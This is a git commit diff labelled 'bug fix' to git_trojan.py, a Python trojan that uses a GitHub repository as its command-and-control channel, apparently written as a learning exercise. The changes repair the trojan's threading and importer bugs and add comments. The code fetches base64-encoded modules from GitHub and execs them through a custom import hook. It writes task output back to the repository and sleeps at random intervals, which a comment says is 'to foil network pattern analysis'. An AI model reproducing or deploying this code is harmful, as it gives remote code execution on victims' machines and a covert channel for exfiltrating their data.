eaa4f6fd14f793f9b5bf6e3984c3d8c63518be6e
AnLau25 <avald024@uottawa.ca>
2025-06-19 19:14:14 -0400

    bug fix

--- GithubCommand&Control/git_trojan.py
+++ GithubCommand&Control/git_trojan.py
@@ -29,7 +29,7 @@ class Trojan:
         self.data_path = f'data/{id}/' # where to write output file
         self.repo = github_connect()
         
-    def get_config(self):
+    def get_config(self): # Retreive remote config document 
         config_json = get_file_contents(
             'config', self.config_file, self.repo
         )
@@ -40,50 +40,55 @@ class Trojan:
                 exec("import %s" % task['module'])
         
         return config
-    
-    def module_runner(self, module):
+     
+    def module_runner(self, module): # Call run functin from imported module
         result = sys.modules[module].run()
         self.store_module_result(result)
     
-    def store_module_result(self, data):
+    def store_module_result(self, data): # Create file for output with name current date-time 
         message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{self.message}.data'
+        remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
     
     def run(self):
         while True:
-            config = self.get_config()
-            for task in config:
+            config = self.get_config() # Grab congig from repo
+            for task in config: # Kick off module with thread
                 thread = threading.Thread(
                     target=self.module_runner,
-                    args=(task['module'])
-                )
+                    args=(task['module'],)
+                ) # Call modules run function
                 thread.start()
                 time.sleep(random.randint(1, 10))
                 
-            time.sleep(random.randint(30*60, 3*60*60))
+            time.sleep(random.randint(30*60, 3*60*60)) 
+            # Sleep for x amount of time to foil network patern analisys
 
 class GitImporter:
     def __init__(self):
         self.current_module_code = ""
     
-    def find_module(self, name, path = None):
+    def find_module(self, name, path = None): # attempt to locate mod
         print("[*] Attempting to retrive %s" % name)
         self.repo = github_connect()
         new_library = get_file_contents('modules', f'{name}.py', self.repo)
-        if new_library is not None:
+        
+        if new_library is None:
+            return None
+        
+        if new_library is not None: # If found, pass to remote file loader
             self.current_module_code = base64.b64decode(new_library)
             return self
     
     def load_module(self, name):
-        spec = importlib.util.spec_from_loader(name, loade=None, origine=self.repo.git_url)
-        new_module = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, new_module.__dict__)
-        sys.modules[spec.name] = new_module
+        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
+        new_module = importlib.util.module_from_spec(spec) # New balk module obj
+        exec(self.current_module_code, new_module.__dict__) # shovel code retreived from github
+        sys.modules[spec.name] = new_module # insert new module to sys module list
         return new_module
     
 if __name__ == '__main__':
-    sys.meta_path.append(GitImporter())
+    sys.meta_path.append(GitImporter()) # Create trojan obj
     trojan = Trojan('abc')
     trojan.run()        
